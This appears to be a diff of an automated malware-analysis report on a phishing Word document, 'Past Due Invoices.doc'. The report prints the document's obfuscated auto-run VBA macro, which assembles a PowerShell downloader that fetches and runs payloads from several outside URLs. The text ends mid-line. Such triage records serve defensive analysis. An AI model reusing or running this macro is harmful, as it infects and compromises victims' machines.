@@ -1,9 +1,131 @@
 {
   "form": 1,
   "observables": {
+    "file:275732af392b42b2e718188d60d6e345339513199a6817baafbf78cc04d3739b": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "Past Due Invoices.doc.olevba/macro_3.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:b12749ad0e060ae0b715a83ebd1bfea23e0b9f4968dac80cc604fc229c55052f",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/csv",
+            "type": "CSV ASCII text"
+          },
+          "summary": "File Type Analysis: CSV ASCII text (text/csv)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:2a2479d153e2be2f49ea1d685f1b12c349f7a74b42747d0514957539743637b5": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "Past Due Invoices.doc.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:b12749ad0e060ae0b715a83ebd1bfea23e0b9f4968dac80cc604fc229c55052f",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with very long lines (457)"
+          },
+          "summary": "File Type Analysis: ASCII text, with very long lines (457) (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:57534217a0c689d4b74a5f54533441e2b91d96e5e7a602cb31a5d537645fbe1e": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "Past Due Invoices.doc.olevba/macro_2.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:b12749ad0e060ae0b715a83ebd1bfea23e0b9f4968dac80cc604fc229c55052f",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
     "file:b12749ad0e060ae0b715a83ebd1bfea23e0b9f4968dac80cc604fc229c55052f": {
       "detections": {},
-      "directives": {},
+      "directives": {
+        "sandbox": true
+      },
       "excluded_analysis": {},
       "paths": {
         "Past Due Invoices.doc": {
@@ -30,11 +152,94 @@
           },
           "summary": "File Type Analysis: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: WNWrpQiR, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Thu Feb 15 15:36:00 2018, Last Saved Time/Date: Thu Feb 15 15:36:00 2018, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0 (application/msword) (ms office document) (ole compound file)",
           "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "base64 string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/Past Due Invoices.doc",
+                "local_path": "2a2479d153e2be2f49ea1d685f1b12c349f7a74b42747d0514957539743637b5",
+                "stream_path": "Macros/VBA/AwfzKPwC",
+                "vba_code": "Function FukvGfXYBqcwd()\nOn Error Resume Next\nNPvzQT = (wKmDSpRabzCO - Int(zYZPZRI) * qPhXBcBPPCdj / Oct(WzWpiTY) - (DzuKrBwRUMi - Sin(872967)))\nUhsFTr = (GvFfRMPKLvYhzd - Int(DZvwjImPmN) * aEwvpv / Oct(PQBQJMGJUs) - (WdsYV - Sin(2576195)))\nNrSfJS = (RkVnTfTSImKMQG - Int(EjNZnQirao) * MQjQCjkAYLGbzW / Oct(qEUwHbzsYJKvai) - (svzYTDjrjbc - Sin(3098967)))\nnvqCJOciczt = (wwYDBVqkmzM) + HJjkJKD(\"AhamhrApYdYDbQraLjclXuR]0Pv+0P'+'v89+'+'[c'+'Har]107),[cHar]34-Swi+SwiREplAce([cHar]83+[cHar]80+[cHar]79),0Pv+0Pv[cH'+'ar]92)UDQISwi+SwiExSwi'+').RepLace(SwiUDQSw0Pv'+'+0Pvi,SwiDyOSBRGpkGwORJut\", 24, 158)\nffSTYijj = (LcYCuHNl - Int(fLPabBurk) * EVTSEE / Oct(YjrmRuszmfr) - (vRQlF - Sin(248492)))\nlNOvEIwtuRv = (wwjGzw - Int(QlwsJTwOj) * tjNRXboVCr / Oct(nnkORzFjodtq) - (dGDuWXCjimrVn - Sin(8176450)))\nlQwYI = (VukvEkdzMd - Int(WsfuAAtVnQXuz) * pIFBstdGiN / Oct(swlHAIrQiAJBn) - (rbRCKzzkQPcX - Sin(9382573)))\nKqMGiKEM = (OXKHroKVp) + HJjkJKD(\"DZmaHSnwPlFYRwinIJQ+IJQe9IJQ+IJQ5aIJQFpT\", 16, 22)\nbqGwdGTFTMu = (RPBRMD - Int(PuHhWicM) * fQkvjndpU / Oct(PCQVP) - (jWGhRTBMuBFB - Sin(3977955)))\nNtwSE = (kKvIwFsjWdmM - Int(JnRzYrumIViGMO) * BihcUiSFH / Oct(XKuAzd) - (EWsYcChJazcoQC - Sin(7324011)))\nHsAAIXfz = (UiovKsNqiKqBh - Int(mIsjB) * VAYfASujqQqG / Oct(UZRKhkMICqSM) - (cZNTwhAwUUJ - Sin(1822636)))\niLCXWRR = (OnHjiVdf) + HJjkJKD(\"SYEBNcO0P'+'v+0PvsIJQ+IJQmartin.com/IJQ+IJQMIJQ+IJQUIJQ+IJQHI0Pv+0PvJQ+IJQaIJQ'+'+IJQ'+'gSwi+SwiMIoSRt\", 8, 91)\ntmwTFQbUIc = (zFIBmtOiCYwb - Int(OwtVliKP) * KDqaA / Oct(IcwLibNVLw) - (FaCQkHrEb - Sin(4249596)))\nMnLXAD = (BiZvYzvFKL - Int(lWacmzoAdhYNd) * NlZvwWZHiaN / Oct(jCQaFlMMpfqI) - (uQasvdVvK - Sin(2163579)))\nQbDITFBc = (VKMpTir - Int(OANlkDbmBRuhuQ) * DFwOizsqYr / Oct(EvZWs) - (oruThfq - Sin(7978257)))\nSqzaCvtdrX = (jTJGTUqUWXUIG) + HJjkJKD(\"zVqtWUUrlLVHptRhXwJENEtllW;IJQ0Pv+0Pv+IJQ5DMIJQ+Swi+SwiIJQNSB IJQ+0Pv+0PvI0Pv+0PvJQ= '+'5DMIJQ+IJQnsaIJQ+IJQdIJQ+IJQasIJSwi+SwiQ+IJQdIJQ'+'+IJQ.nexIJQ+IJQtIJQ'+'+IJQ('+'1000IJQ+IJQ0IJQ+IJQ'+',IJQ+IJsT\", 27, 172)\nuJuiussw = (hwjNfYjtDVGWa - Int(YOHYMI) * lzLQlXv / Oct(pZJslJqodoF) - (jOjdmKNqtuw - Sin(9701468)))\nfYmzGwO = (fvwUwtBoONw - Int(iowhadkGciWQii) * JElvcKMFNs / Oct(juDrVBmf) - (VPITQL - Sin(8362901)))\nzjThUjrBbGM = (BZimS - Int(skcRUmSj) * pHwqDkIVdCWG / Oct(vSiQTIDoJhObL) - (tkSspl - Sin(5841641)))\ntHiFAXSsA = (kVPIBVKo) + HJjkJKD(\"pZquIICOFNaRzCPvJQ+IJQtp://g0Pv+0PvaSwi+SwiIJQ+IJQsvIJQ+IJQersorgIJQ+IJQervergIJQ+I0Pv+0PvJQleiI0Pv+0PvJQ+IJ'+'0Pv'+'+0PvQch.bi'+'IJQ+IJQzI0PvuFXEGrzldwJR\", 15, 128)\nwCoKiQAQc = (iOrdPkLJjU - Int(cHLvipKk) * zSQNT / Oct(zPZjFhmllGw) - (dTtaPriMCbHo - Sin(3791310)))\nUTsiUhiJdVi = (LbdPwiKjn - Int(kzOhpVZpiAjRKW) * YiGjV / Oct(kMkWKH) - (IRfzfwqPc - Sin(158352)))\nEbBGi = (hCSGTouRG - Int(ZzDzRnz) * iLfNDjQUilMj / Oct(wdkzTpitwbtB) - (iRczOK - Sin(8175230)))\nNXDht = (wLwoJmDTJfwj) + HJjkJKD(\"YrbfRVIQROLaIJQ.com/IJ'+'Swi+SwiQ+IJQo20Pv+0PvxIJQ+IJ'+'Q7Bx/?hIJQ'+'+IJQtI0Pv+0PlcdYcFwJjUqmRmkHloKN\", 13, 68)\niWYbwoEKQsQ = (VtijlMtwzslXCq - Int(wotfUD) * uqSobjEvJwQL / Oct(iPFFGFmqF) - (lCjPfhZU - Sin(5688691)))\nVVzOhCBLs = (fzrRwkKtDjoHqU - Int(ijnYOQzoWh) * sTZOjbmPpjYo / Oct(WutnWj) - (LOowzmwOfj - Sin(2046683)))\nzzGslqVUVr = (jKsrToAMU - Int(isJvfCUXMS) * EadfcQzfXkJYC / Oct(zdDZw) - (TIkkvmCGt - Sin(8946337)))\nmvnUTNul = (ZZdVSAz) + HJjkJKD(\"rowuFKrskr5IJQ+IJSwi+SwiQaSPIJSwi+Swi0Pv+0PvQ+IJQO9'+'5IJSwi'+'0Pv+0Pv+S'+'wiQ+IJQa + 5DMNS'+'B '+'+IJQ+tTwr\", 11, 94)\nKwLNQmuwz = (qhYQwN - Int(WvpsjqOqmdcpjX) * MOsibSnLu / Oct(bfMZViJ) - (uJjvWb - Sin(182515)))\ndwmwSsKIC = (MuTNfn - Int(QUJXPmiijui) * KCRRzS / Oct(lNqRsQhRFts) - (jovvELGuTQa - Sin(9994398)))\nVNbFti = (sTqGv - Int(UvwBVZDRHi) * YpqOuTOG / Oct(GtYPVnq) - (AzqLKQYl - Sin(7381687)))\nPbMAQ = (rXDjwqVT) + HJjkJKD(\"dJlzHjUFVTtONvjUv]-JoiN'')jYHn\", 18, 9)\nPEfZOFacbua = (ijnRJrJOZSc - Int(folMMt) * QdChdDw / Oct(LctzOEH) - (mNcpTpdLqJoUn - Sin(2830681)))\nvzvQAvvsLj = (KhJRBfCJO - Int(dwmfUND) * zzzjEtaAr / Oct(TOcbwFjQFnGMk) - (Ocqqr - Sin(6262956)))\ntmdlrIJDB = (wkzqPXacQ - Int(BoLpzkCCjvEIQ) * kPvVcDkJ / Oct(VXdikji) - (oowEXY - Sin(2648930)))\nhiMmOU = (cziWbWh) + HJjkJKD(\"Ti+SwiJQ+IJQm95aIJQ+IJQ)IJ'+'Q+IJQSwi+S'+'wi(5IJQ+IJSwi+SwiQDMSIJ0Pv+0PvQ+IJQSwi+Swi0Pv+0PvDIJQ+jbNARwitZblAiBQnSQbhKOlEmtYGYtdUFjM\", 2, 95)\nXENIt = (SWFRVzmQTTMNq - Int(GkPvwZDkJwf) * GDnbqNtivsm / Oct(SNwATBTsK) - (zQwKtEmhMGmpq - Sin(6830968)))\nidDpWVBsm = (rczTHlNzsd - Int(bDQHfnVMDXdf) * pwNffjdW / Oct(XbYTYDI) - (SFhIciRFbzTd - Sin(6088173)))\ntVtdiUirJ = (OwjiKX - Int(SIzNMfojLOS) * RFYwK / Oct(NwaEkJs) - (SNbnuskEzwh - Sin(9015604)))\nnlQoEIdD = (fFAbFANGrd) + HJjkJKD(\"iEqNKWsJSRVqbKQzzTZtiHuDsPmXnJniuwi).RepLace(([0Pv+0P'+'vcHaR]73+0Pv+0Pv[cHa0Pv+0PvR]740Pv+0Pv+[cHaR]81),[STRING][cHaR]39) ) 0Pv).REPlAcE(([chaR]102+[chaR]118+[chaR]77),[STrIng][cbvw\", 34, 146)\nCuzOrsHkd = (YpVdMaI - Int(TaUMFcQPw) * TFozIT / Oct(SYcSdvJwl) - (sZlrCNrQa - Sin(967341)))\nQGWlIA = (uNhFU - Int(HBZYjBJuCfFq) * LOUEYpKSRr / Oct(iiOTYKvMIIBzLz) - (Ycwzima - Sin(9270781)))\njtbJpSTXVB = (naJJQJUpKdpwm - Int(WsktiVJRJENR) * VSIKImUjwBl / Oct(woLmhJMlnaHwts) - (kWQEvwbwXB - Sin(3670852)))\nzCCSbH = (pwVRwbG) + HJjkJKD(\"fBTBmjoOJJCvQlasHPvkJCb0'+'Pv+0PvQch{}I'+'JQ+IJQ}IJ0P'+'v+0PvQ) -CrePlAcE  IJQ5'+'DMIJ0P'+'v+0PvwQpjP\", 24, 73)\njpLhPQT = (hwpzXq - Int(lOdATdCQAwJt) * spJvTjCNrCQA / Oct(zquIALqKsMS) - (LQsuJ - Sin(4046834)))\nhITMliA = (SwRsnu - Int(qnatMNzmiM) * svzCbzcru / Oct(QKShjI) - (ihwGNWVDkzA - Sin(965729)))\nAlvsjMVVTSM = (YmfYR - Int(KQXSPwAVa) * HLfEREzNPi / Oct(bzrAcmtid) - (uQHzRKOiKN - Sin(83945)))\nDivfIXtm = (vAfuvKJRQLk) + HJjkJKD(\"tIpNFIJQ+IJQIIJQ+IJQBWJlIJQ+IJQenYk(5DIJQ+IJQSw'+'i+Sw0Pv+0PviMIJQ+IJQasIJQ+IJQfISwi+SwiJQ+IJQcIJSwi+SwiQ+IJQ.nIJQ+IJQY'+'kT0Pv+0Pvo'+'StrBIJ'+'Q+'+'IJQWJIJQ+IJQ'+'iiKuElGOWCzqWavEDYipvuoXmPzR\", 5, 161)\nZklUSAu = (tiiFQZfYPMHlIO - Int(MldIOAiwvzGN) * cPrwtlaHnDWaDs / Oct(FfYwYHlb) - (PrwOljFK - Sin(2287569)))\nwpoiYWi = (wzULrXnhZiG - Int(KHNrQaHosrn) * hCmLVEzLO / Oct(wRkThblaM) - (LhhrBuTfCXnEM - Sin(9110906)))\nzNEvnRFsl = (plbLUkuTmL - Int(GwtjDRftNzUvKb) * SJqkrEpprpJO / Oct(JRNufEnWlWUVZ) - (hiUpRkjR - Sin(7172360)))\nahhFSl = (SnKHnwzNvXG) + HJjkJKD(\"GjqubhswjqWRDMojNYhEzWZ+0PvJQ+ISwi+SwiJQ/IJQ+IJQms27r/?IJQ+IJQhISwi+Swi'+'JQ+IJQttSwi+Swip:IJQ+IJQ//ccwclIJQ+IJQSwi+Swi'+'aIJQ'+'+IJ0Pv+0PvQss.neIJQSwi+Swi+IJQt/6SrlSIJQ+IJQ0Pv+0PvcIJQ+ISwizFLHIKiMENjYbjz\", 24, 166)\nwNsHM = (HKWzriIrflrL - Int(WQjfaSm) * lstaKwUkwFn / Oct(FJvfq) - (ZftQA - Sin(6757091)))\ndnqRApXW = (uQwzH - Int(wfEWSdZhhnGhfD) * GMUDoX / Oct(HnUrKWQfWmqJr) - (AndCRVssn - Sin(6702502)))\nHpjsc = (funEduTZD - Int(QCaSDQBQT) * WMlFZrBXCAOAl / Oct(fbcbssWkn) - (jkCjNEqbTrzTIh - Sin(5880084)))\nmbcpoNSTKIb = (wmaPGnOhnWOR) + HJjkJKD(\"AUSXbsmzUwTknBJQ+IJQS/IJQ+ISwi+SwiJQ?IJTvzfqivkonOzbdjBXIdRvOz\", 15, 24)\nqLZXvbRM = (JnjuWLSuzFAaNk - Int(TUwwlRRDtWNvW) * pwamYtV / Oct(WibJscRauYn) - (CUqUYjsjnXJQwi - Sin(1391038)))\nthOCQ = (ZoorUk - Int(PVbYolScoHZKVI) * OsAlvw / Oct(KNJVKAFjw) - (RWazwIEzUv - Sin(3872049)))\nzREJRQ = (WYlwTZ - Int(qiowqLNOTbSWEL) * swiGSkwobDFBrl / Oct(LjjnFtdXjoi) - (lWCZPzZjnQNHM - Sin(8803309)))\nTKIiS = (aUmYmVooRJ) + HJjkJKD(\"XrlvdLhMGnTQ,[cHar]36  -REplAce'+'  ([cHar]57+[cH'+'ar]53+[cHar]97),[cHar]39-REplAce  IJQBWJIJQ,0Pv+0Pv[cHar]96  -REplAce([cHar]110+[cH'+'Swi+Swi'+'arBiLQaHV\", 12, 139)\nBNHiw = (DSFvuTYbLzPcz - Int(MQBGRjzsVR) * SuYVico / Oct(vGEYnURR) - (tEzwAoWaKKHus - Sin(2182678)))\nzFWmJmj = (oicYAFdWbKCXIs - Int(lzRHwQR) * RGBvXSj / Oct(DvHkEssRk) - (hXowQOiw - Sin(4765495)))\nZvGPjMhj = (ckMjWU - Int(SwKGEum) * cBIItGAWiitaTq / Oct(NatYuSiaNkia) - (aJddBznN - Sin(5022342)))\nMcdquV = (awSjqLRYd) + HJjkJKD(\"kiRmoXaMibRWpqkvNGzjbaPbjQpSTIc+IJQ+IJ0Pv+0PvQ+IJQ90Pv+0PvSwi+Swi0Pv+0Pv5aw95a+95a-objIJQ+0Pv+0PvIJQ'+'e'+'cIJSwi+SwiQ+IJQtSwi+Swi95aIJQ+0Pv+0PvI0Pv+0PvJECiBzsIU\", 32, 122)\niVdAz = (ZFQYTDYmmNXSEE - Int(lrrzFciSHJ) * snfQUVtR / Oct(sLUXY) - (KszwZbqwIjTh - Sin(5550673)))\nWbpmjwqf = (unJPAKlH - Int(tBZmzlZWT) * SRlUIjrBqX / Oct(AoQzKECFXNC) - (WEzAp - Sin(8395887)))\nphDFwQVwSfK = (jJzGKCI - Int(AfIJujls) * IpojXQw / Oct(QOPQLjC) - (fnaBiG - Sin(8978139)))\nZAjOBpNaU = (LVsjuauXKji) + HJjkJKD(\"LFSFjVCPtPYSznMqrNNizvMWFZpmJY0Pv+0Pv+IJQADCIJQ+IJQX = 95IJQ+'+'IJQa http:/Swi+Swi/ISwi+'+'SwiJQ+IJQastoriatr'+'ISwi+SwiJQ+0Pv+0PvIJQainiI'+'JQ+IJQnIJQ+0Pv+0PvIJQgSwi+Sw0Pv+0PviIJQ+iHoRYjbYr\", 31, 151)\nEwKulQXQE = (tCsuotC - Int(wGwOwLqfCunu) * qiJIuiDbq / Oct(HBbhw) - (LGHjMdIFtXYV - Sin(772102)))\nBGzKtmtCOfw = (EPkqCUjmtOwNF - Int(rNUis) * qofKJNaDOXFiX / Oct(wrQli) - (FZMtkwYENf - Sin(605962)))\nUbBMir = (dNzPjahpufXWI - Int(pEFzwjzO) * RbmZKpVqjTLE / Oct(BiIqEp) - (aCqkUITzOiU - Sin(9037144)))\nVjZjwIz = (TkMjszCi) + HJjkJKD(\"COfhuzFcnMjuNXl+SwiJSwi+SwiQT/?http:S0Pv+0Pvwi+Swi/IJQ+IJQ/cowjGd\", 16, 46)\npHlZlfJSIHA = (JiKPlCFCVW - Int(AzQpjUuLph) * LkOnmIcQcWcpl / Oct(SSCuvTiCNoCj) - (zicjQzTSa - Sin(180346)))\nEzDKKY = (PzZEtFXKfFNBsQ - Int(OLJWZkFmdiAqL) * RSsRDfwuZIIQs / Oct(QlhkQ) - (jHIDaOJKv - Sin(4408762)))\nWmlDvaljKfw = (PMSNmUjolvTmA - Int(JsEVsAQ) * oIJJpqpVnw / Oct(QsEZo) - (QzvibPVIoR - Sin(4274855)))\nJHrXAqHQB = (poCzLfCWrG) + HJjkJKD(\"zJr'+'+0PvJQoreIJQ'+'+IJ0Pv+0PvQachIJQ+IJQ(50Pv+0Pv'+'DIJQ+IJQMSwi+Swiasfc in 5DMADCXIJQ'+'+IJQ){try{IJQ+IJQ5DSw'+'i+SwiMVZPbuNViwbhvBlsZjwrAcoij\", 4, 118)\ndTPZh = (kWFSPqbCUvN - Int(oBAZSQwujnDjP) * BlFwPStlXSMD / Oct(wbTIuKQPbiTjw) - (bDzSYD - Sin(5823986)))\nCsqYQZXnm = (qzXfuACdiNPa - Int(SMiIWzWZGlQQJS) * aznzLJlVlOP / Oct(MwwFQYKI) - (TKCEIPkLHOlhV - Sin(517389)))\nnMmbWSKI = (ZQOqhrtuGjJ - Int(KfzszJqHpk) * DtAJiziiqwNfAJ / Oct(azZQvVwp) - (fHWmXfvtp - Sin(4062407)))\nqpQSEaibvD = (DdfszPIV) + HJjkJKD(\"sSJQ+IJQhtIJQ+IJQtp:/IJQ+IJQ/FlPsAwAwZUdjljVBCAbzbJGmihKmFXnjhj\", 3, 27)\nXjkQEaIqZ = (pZFDbdWdr - Int(LAUqfz) * uSKWSUiKc / Oct(InGooNTzvGt) - (DsQkrH - Sin(5729972)))\nLJLtk = (JTlJoYWDWF - Int(twzOqlVXnA) * jrcoOSFhdXjAW / Oct(BzAPqQcqfAHG) - (ZzVkqcRkth - Sin(9990385)))\nXskjVjO = (EzobCM - Int(baonUHwjOtLbhI) * jiHnqYEDIPAF / Oct(TnOdoJiDkLBc) - (sDriFSCPRGUPW - Sin(4992570)))\nzmYFCmXXu = (iwAzjfjqh) + HJjkJKD(\"LTdKsulNIMptdaqqSzPpAwwrPuEROzbSrIJQCIJQ+IJQ)Swi+Swi;break;}caIJQ+IJQtIJQ+IJPR\", 34, 43)\nzPvmbnt = (KhDWBhuNSj - Int(jEnjak) * cNzRtYiWkO / Oct(auUJG) - (mwnOtjV - Sin(4161698)))\nSbWZLwvJwVH = (UEqiZjLDZzas - Int(irfwjIrooXza) * bwNidiwEEafCo / Oct(OquKjVwUv) - (wDMdAjhtHjI - Sin(2848328)))\nmvzcfLPiaI = (qWvwjZQAusndw - Int(NRFuGAilaRSEX) * muHMzAEnkYPui / Oct(CKZACnTbClB) - (LEvidfB - Sin(4495721)))\nIjFjXi = (nYdlvWGKvfBM) + HJjkJKD(\"mVwiohDHKhPXhaR]36).REPlAcE(([cha'+'R]83+[chaR]119+[chaR]105),[STrIng][chaR]39).REPlAcE(0P'+'vDy'+'O0Pv,[STrIng][chaR]'+'124)'+' Xjb in'+'VOke-EXpRe'+'sSIoN').ReplaCe(([chaR]88+[chaR]1dSjEXdwMajwPfEJfRfwnVmK\", 13, 172)\nGFjAcYoZX = (rVLlozr - Int(vjsHUD) * zWEzutWGp / Oct(PVjlLdRzDHOOr) - (phblvT - Sin(2802298)))\nBkvJTAhMmu = (fpsvzmfQUP - Int(uZiLUjGbJ) * vLkivINS / Oct(KWdnqqtQjiSn) - (zszjLVHBprEL - Sin(6877918)))\ntERUL = (HQBiRwjFzQ - Int(nUbSZzrdIMsh) * zrLjVfY / Oct(GMlAfzAoDt) - (jwXAjjPtNibSP - Sin(6802470)))\nvHwSzRACz = (jfLWwiPsSBkZ) + HJjkJKD(\"TYiQ+IJQ5a+90Pv+'+'0Pv5aw-IJQ+IJQobjeIJ0Pv+0PvQ+IJQc95a+95IJQ+IJQa'+'t95a) ranIJQ+IJQ'+'dIJQ+I'+'JQom;5DMYYU ='+' .(9I0Pv+0PvJQ+IJQ5IJQ+IJQaVjjALoPmXlmkwjQznnzSbjicd\", 4, 137)\njtTRDR = (tftVQpT - Int(BEJYoppsq) * VwWuWAQj / Oct(GkIwijhQCO) - (CEiQmAIa - Sin(2231578)))\nzVfkkEV = (kzokkpozJ - Int(FhNMptFfpHYnd) * OQRFHVrpX / Oct(WmTOu) - (sRsUPUqRbtudl - Sin(829559)))\nwJvzhjOXjH = (wUSVTXirnCPJKp - Int(ZqkvO) * vIGtaz / Oct(OaODTEaSAs) - (VKZFSzKjbX - Sin(3676014)))\njIzUzZ = (zqoESzANaqiAFl) + HJjkJKD(\"XWfKJqJJLdQaQaeIJQ+IJQ-Swi+SwiIIJ'+'Q+IJQteISwVaNMqwIYskTioNiMuUnjIjaB\", 13, 34)\nZWpjcV = (qFPlYwJ - Int(EhpqGiuXH) * WWNdMZGoQizGzs / Oct(oUaMmuGiQl) - (LUFtwA - Sin(9353868)))\nLajFIjzb = (qRwNtqikhbb - Int(kzLSOTLVBQnwrC) * mjXjzJP / Oct(MqHhV) - (JYGonZ - Sin(2603990)))\naQKGKSRnHI = (nifpbf - Int(iBVqcsBJsi) * UwwcHlpNrrhH / Oct(cAdvs) - (Iijbi - Sin(7808497)))\nKAYnuj = (McsYDcNn) + HJjkJKD(\"nbHLLhzcHYtiSOXrqtAoDOPIJQ IJQ+IJQSwi+Swi(95aIJQ+IJQ.IJQ+IJQeIJQ+0Pv+0PvI0'+'Pv+0PvJQx95a+IJQ+IJQ95IJQ0Pv+0Pv+IJQae95a)IJQ+IJSwi+Sw'+'iQ;fIJQ+I0PvbwFjOnPm\", 24, 123)\nwwvUU = (FRoWGkU - Int(nVuvzicT) * FYiTkUJITvsluV / Oct(RADzZotTwt) - (CzDQGGdwL - Sin(8041987)))\nifNzbYmuBbM = (vUwfNmpbiszRi - Int(iftILElZNSJFDp) * IwJnYEiAubGi / Oct(PiCiZTbaj) - (zlHWHiVIjAoW - Sin(8867539)))\nKCzwzsNI = (iFswizhFZQKiQ - Int(fjOMYKJBRi) * WYTXijskLE / Oct(aiwkGuLq) - (ZOuczlc - Sin(9706014)))\npSUDSTMl = (uzOoiwtQNc) + HJjkJKD(\"tHjPKpMiDqIJQ+IJQemIJQ+IJQ.Swi+SwiNSwi+Swiet0Pv+0Pv.WebClI0Pv+0PvJQ+IJQieSwi+0Pv+0'+'PvSwiIJQ+Swi+SwiIJQntPQcIYdo\", 11, 96)\njjAfAskCJEh = (qaWBIiq - Int(sDuBibiQJ) * JrLPGubJXPrC / Oct(KiRmNnT) - (wXLDjXwZvhsZci - Sin(2473109)))\nzWuUqtZ = (aUcaw - Int(ajpqjW) * pQdqoMU / Oct(MZWfk) - (hwckjROMtK - Sin(8629826)))\nfZbTjqTIlF = (pwfNq - Int(ZLFROinSsCNv) * uNfthN / Oct(DFzdXS) - (nXXVwiiGYWQjtw - Sin(2708842)))\nEwoVQ = (zEXMIjQnE) + HJjkJKD(\"TzrWCUTNcSwwqDAYoMjRjV06+[chaR]98),[StRInG][chaR]124).ReplaCe(([chaR]48+[chaR]80+[chaR]118),[StRInG][chaR]39)|&((GEt-varIABlE '*MdR*').nAME[3,11,2hj\", 23, 124)\ncULKhEvAz = (AuVhPMXopJcz - Int(JpjoiaNz) * NUXzwzmMtXnIvT / Oct(djkhJ) - (zaBhavnXzTjlAj - Sin(205268)))\nFYUSEVD = (RNaCcPF - Int(KNVcKv) * jqBNtVQYBwovE / Oct(XvmCS) - (WGHVjVrW - Sin(2519921)))\nilitRdEtSfS = (LNCdDvzSH - Int(ApYEnUBGnSjZ) * dSZjjdXitLcmb / Oct(aAbwTuiRhiChP) - (kjuqlUYK - Sin(5683768)))\nfRPzhSoqRX = (kkUMctw) + HJjkJKD(\"GS('(0Pv& ( fvMS0Pv+0PvheLlid[1'+']+'+'fvMsheLlId[13]+SwixSwi)((Swi((IJQ5DMSwi+SwiIJQ+IJQnsad0Pv+0PvIJQ+IJ'+'QaIJQ+IJQsd = &(95IJQSwi+Swi+IJ0P'+'v+0PvQan95IJQ+IJQa+95ae9IJobGEQkqwtF\", 3, 169)\nohQibFwbH = (lrjwODu - Int(QlAGVQ) * PdfKUJDll / Oct(ptiYYbHGL) - (mfUajPzNK - Sin(3174889)))\nLwVjUjfwHd = (EJjvtk - Int(tCiFudYJ) * lsKtzJs / Oct(jIEiELpbVPlk) - (cirnMIpjlrCXAM - Sin(4117543)))\npzNMvIfvDsh = (XFvRw - Int(kfpprti) * NnZTINSFn / Oct(CEwRB) - (DzTawJ - Sin(8103369)))\nnCWjHvVjvko = (MaaFLWPiO) + HJjkJKD(\"GPuXplAhOcNQSkUzhRPv+0PvJQ9IJ'+'Q+IJQ5IJQ+IJVKhzprOOKXqYliM\", 19, 26)\ndzkOdslCnz = (RSuPtNTiilr - Int(EbEwGVqTH) * PiFCmo / Oct(JWvLshqvCDEb) - (PlaXzkYSqLN - Sin(7829281)))\noZWowJ = (JCLKraisYP - Int(NLuNBDSmsasiIi) * BPTSLi / Oct(SYnksMdwo) - (WiJlqLRntawzQ - Sin(4674156)))\nLnizfj = (clYPY - Int(DNqtWa) * LFIwlBId / Oct(TLEBfSIaS) - (PhQaFj - Sin(3100778)))\nFzsEA = (LdPzhDH) + HJjkJKD(\"Awbf'+Swi+SwiIJQ Swi+Swi=IJQ+IJQ 5DIJ0Pv+0PvQ+IJQMeIJQ+IJQn0Pv'+'+0PvSwi+SwiIJQ+IJQv:IJQ+I0Pv+0P'+'vJQpIJQ+IJSwi+SwiQubliIJQ+IJQc +0Pv+0Pv 9'+'IJ'+'Q+IJQ0Pv+'+'0PvkXuaiWXzpmadFqNbibckfsTITihsoI\", 5, 159)\nndWlrDBS = (PbOKju - Int(DPVRpMFcrT) * DiqaE / Oct(zHNIrUtJjLDPF) - (RhIOkszaMw - Sin(8018193)))\nahXkzSD = (sVXHOpXWL - Int(jWLvcHIABM) * skVVcpLuZvPS / Oct(cXmZzOsiO) - (AmCpQqRLwdjz - Sin(7200162)))\ndvQfd = (lmzLb - Int(jRDpTEVjDnUD) * uUiZzvEHjS / Oct(mcmknKOjGcIjj) - (WLViIJJ - Sin(6237109)))\nodGmB = (QZDSNLWal) + HJjkJKD(\"FGNKiWajAPDDMbSjPQQ IJQ+'+'IJ0Pv+0PvQ28IJQ+IJQ21IJQ+IJQ'+'33)IS0Pv+0Pvwi+SwiJQ+IJQ;IJQ+IJQ5DMIJQPkbzDAM\", 19, 78)\nuHcVHr = (djiZbJj - Int(GvCkzO) * jwLjWJft / Oct(mPjVkUEwEAWh) - (FWpjzkWhKwLY - Sin(2480568)))\nzWLoTMq = (aBcDw - Int(wmLZLVlrGjwri) * tptpLuWCcSYzXS / Oct(ubwYrqSKQV) 